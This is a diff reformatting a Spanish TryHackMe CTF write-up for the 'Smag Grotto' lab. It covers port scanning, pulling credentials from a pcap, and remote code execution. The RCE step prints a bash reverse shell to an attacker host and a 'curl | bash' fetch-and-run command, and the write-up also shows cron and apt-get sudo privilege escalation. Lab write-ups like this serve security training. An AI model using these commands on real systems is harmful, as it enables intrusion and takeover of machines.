@@ -1,37 +1,45 @@
 ---
 title: Smag Grotto - Tryhackme
 date: 2023-11-6
-categories: [Write up, Linux, Tryhackme]
-tags: [wireshark, crontab, suid, easy]     # TAG names should always be lowercase
+categories:
+  - Write up
+  - Linux
+  - Tryhackme
+tags:
+  - wireshark
+  - crontab
+  - suid
+  - easy
 ---
+
+# Smag Grotto
 
 Esta maquina es de dificultad facil, en el cual tiene un sitio que contiene un `.pcap` en el cual analizando con wireshark podemos obtener una credeciales que nos serviran para loguearnos a un panel de ejecución de comandos. Para escalara privilegios haremos uso de una tarea que se ejecutar
 
 ![20231106093655.png](20231106093655.png)
 
-- Link : [Smag Grotto](https://tryhackme.com/room/smaggrotto) 
-- Created by  [jakeyee](https://tryhackme.com/p/jakeyee)
+* Link : [Smag Grotto](https://tryhackme.com/room/smaggrotto)
+* Created by  [jakeyee](https://tryhackme.com/p/jakeyee)
 
-# Metodología
+## Metodología
 
-- Enumeración
-  - Escaneo de puertos
-  - Enumeración del puerto 80
-  - Enumeración de los directorios del sitio web
-  - Wireshark
-  - Enumeración del cms Subrion
-- Explotación
-  - RCE
-- Escalar Privilegios
-  - Crontab
-  - Binario apt-get
+* Enumeración
+  * Escaneo de puertos
+  * Enumeración del puerto 80
+  * Enumeración de los directorios del sitio web
+  * Wireshark
+  * Enumeración del cms Subrion
+* Explotación
+  * RCE
+* Escalar Privilegios
+  * Crontab
+  * Binario apt-get
 
+## Walkthrough
 
-# Walkthrough
+### Enumeración
 
-## Enumeración
-
-### Escaneo de puertos
+#### Escaneo de puertos
 
 Iniciamos con nusetra herramienta preferida a escanear los puerto de la maquina victima
 
@@ -53,8 +61,7 @@ Para entender un poco mas de los parametros que lanzamos con `nmap` podemos leer
 
 `-n`: Esta opción le dice a Nmap que no realice la resolución de nombres DNS. Puedes usarlo si no deseas que Nmap realice búsquedas DNS inversas durante el escaneo.
 
-`-oG allportsScan`: Esta opción le indica a Nmap que genere la salida en formato "greppable" (Grep) y la guarde en un archivo llamado "allportsScan". Este archivo contendrá información detallada sobre los puertos abiertos y otros detalles del escaneo.
-Para entender un poco mas de los parametros que lanzamos con `nmap` podemos leer un poco lo siguiente:
+`-oG allportsScan`: Esta opción le indica a Nmap que genere la salida en formato "greppable" (Grep) y la guarde en un archivo llamado "allportsScan". Este archivo contendrá información detallada sobre los puertos abiertos y otros detalles del escaneo. Para entender un poco mas de los parametros que lanzamos con `nmap` podemos leer un poco lo siguiente:
 
 `-p-`: Esta opción indica a Nmap que escanee todos los puertos en lugar de un rango específico. El guion ("-") significa "todos los puertos". Esto permite escanear todos los puertos desde el puerto 1 hasta el 65535.
 
@@ -84,7 +91,6 @@ Enumeros los puertos abiertos
 ❯ nmap -p22,80 -sV -sC -vv -Pn [IP-ATTACKER] -oN servicesScan
 ```
 
-
 `-p22,80`: Esta opción especifica los puertos que se van a escanear. En este caso, se están escaneando los puertos 22, 80. Los números de puerto están separados por comas y no se utiliza el rango de puertos.
 
 `-sV`: Esta opción realiza la detección de versiones de servicios. Nmap intentará determinar qué servicios se están ejecutando en los puertos especificados y mostrará información sobre las versiones de esos servicios.
@@ -95,12 +101,11 @@ Enumeros los puertos abiertos
 
 `-vvv`: Esto establece el nivel de verbosidad del escaneo en "muy alto". Esto significa que Nmap proporcionará una salida detallada que incluye información adicional sobre el progreso del escaneo.
 
-`[IP-VICTIM]`: Debes reemplazar [IP-VICTIM] con la dirección IP del objetivo que deseas escanear. Este es el host en el que se realizará el escaneo.
+`[IP-VICTIM]`: Debes reemplazar \[IP-VICTIM] con la dirección IP del objetivo que deseas escanear. Este es el host en el que se realizará el escaneo.
 
 `-oN servicesScan`: Esta opción le dice a Nmap que genere la salida en formato "greppable" (Grep) y la guarde en un archivo llamado "servicesScan". Este archivo contendrá información detallada sobre los servicios y versiones detectadas en los puertos especificados.
 
 Al ejecutar `nmap` con los puertos abiertos, nos reporta lo siguiente:
-
 
 ```java
 PORT   STATE SERVICE REASON  VERSION
@@ -120,13 +125,13 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### Puerto 80
+#### Puerto 80
 
 Enumeramos el puerto `80` y podemos ver una web
 
 ![20231106093856.png](20231106093856.png)
 
-### Fuzzing
+#### Fuzzing
 
 Enumeremos los directorios del sitio web, yo voy a enumerar con `gobuster` tu puedes usar el que prefieras
 
@@ -138,7 +143,7 @@ Enumeremos los directorios del sitio web, yo voy a enumerar con `gobuster` tu pu
 
 `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: Con esta opción, estás especificando el archivo de lista de palabras que Gobuster utilizará para probar nombres de directorios y archivos. En este caso, se está utilizando el archivo "directory-list-2.3-medium.txt" que se encuentra en el directorio "/usr/share/wordlists/dirbuster/" como fuente de palabras para la fuerza bruta.
 
-`-u http://[IP-VICTIM]`: Esta es la URL del sitio web en el que deseas realizar la búsqueda de nombres de directorios y archivos. En este caso, se está apuntando a "http://[IP-VICTIM]". Gobuster intentará encontrar nombres de directorios y archivos en esta URL.
+`-u http://[IP-VICTIM]`: Esta es la URL del sitio web en el que deseas realizar la búsqueda de nombres de directorios y archivos. En este caso, se está apuntando a "http://\[IP-VICTIM]". Gobuster intentará encontrar nombres de directorios y archivos en esta URL.
 
 `-t 100`: Con esta opción, estás especificando el número de hilos que Gobuster utilizará para realizar los ataques de fuerza bruta. En este caso, se están utilizando 100 hilos para acelerar el proceso.
 
@@ -152,7 +157,7 @@ Enumeremos los directorios del sitio web, yo voy a enumerar con `gobuster` tu pu
 
 En el `http://[IP-VICTIM]/mail` visualizamos un `.pcap` el cual descararemos para poder analizarlo
 
-### Wireshark
+#### Wireshark
 
 ![20231106095520.png](20231106095520.png)
 
@@ -171,46 +176,48 @@ Server: Apache/2.4.18 (Ubuntu)
 Content-Length: 0
 Content-Type: text/html; charset=UTF-8
 ```
-## Explotación
+
+### Explotación
 
 ```java
 username=helpdesk
 password=cH4nG3M3_n0w
 ```
+
 Con las credenciales que encontramos, vamos a loguearnos en la dirección que web que encontramos en los paquetes del `.pcap`
 
 ![20231106100958.png](20231106100958.png)
 
 Al loguearnos nos encontramos con un panel donde podemos ejecutar comandos. Vamos a hacerlo como lo hago yo
 
-### RCE
+#### RCE
 
-- Primero, creamos un `ìndex.html` donde estara nuestra revershell
+* Primero, creamos un `ìndex.html` donde estara nuestra revershell
 
 ```java
 ❯ nano index.html
 bash -i >& /dev/tcp/[IP-ATTACKER]/4242 0>&1
 ```
-- Segundo, en otra terminal iniciamos un servidor en python3
+
+* Segundo, en otra terminal iniciamos un servidor en python3
 
 ```
 ❯ python3 -m http.server 80
 ```
 
-- Tercero, ejecutamos lo siguiente en el panel donde podemos ejecutar comandos
+* Tercero, ejecutamos lo siguiente en el panel donde podemos ejecutar comandos
 
 ```java
 curl http://[IP-ATTACKER]| bash
 ```
 
-
 ![20231106101451.png](20231106101451.png)
 
-- Antes de ejecutar debemos de poner `ncat` a la escucha para recibir la shell
+* Antes de ejecutar debemos de poner `ncat` a la escucha para recibir la shell
 
-## Escalada de priviliegios
+### Escalada de priviliegios
 
-### Usuario www-data
+#### Usuario www-data
 
 Luego de ejecutar, obtnemos una shell
 
@@ -224,18 +231,18 @@ Enumerando encontraremos que existe una tarea cron
 cat /etc/crontab
 ```
 
-### Crontab
+#### Crontab
 
 ```
 *  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
 ```
 
-Esta tarea que lo ejecutar `root` el cual hace una copia de `/opt/.backups/jake_id_rsa.pub.backup` al directorio `home/jake/.ssh/authorized_keys`. Podemos aprovechar ya que tenemos permisos de escritura del archivo `jake_id_rsa.pub.backup` y agregar nuestra `id_rsa.pub` 
+Esta tarea que lo ejecutar `root` el cual hace una copia de `/opt/.backups/jake_id_rsa.pub.backup` al directorio `home/jake/.ssh/authorized_keys`. Podemos aprovechar ya que tenemos permisos de escritura del archivo `jake_id_rsa.pub.backup` y agregar nuestra `id_rsa.pub`
 
 Puedes revisar como crear una [clave publica ssh](https://git-scm.com/book/es/v2/Git-en-el-Servidor-Generando-tu-clave-p%C3%BAblica-SSH)
 
+#### Usuario jake
 
-### Usuario jake
 Haciendo uso de nuestra `id_rsa` podemos loguearnos sin proporcionar contraseña
 
 ![20231106110606.png](20231106110606.png)
@@ -252,7 +259,7 @@ Haciendo uso de nuestro recurso de [gtfobins](https://gtfobins.github.io/gtfobin
 sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
 
-### usuario root
+#### usuario root
 
 ![20231106111155.png](20231106111155.png)
 
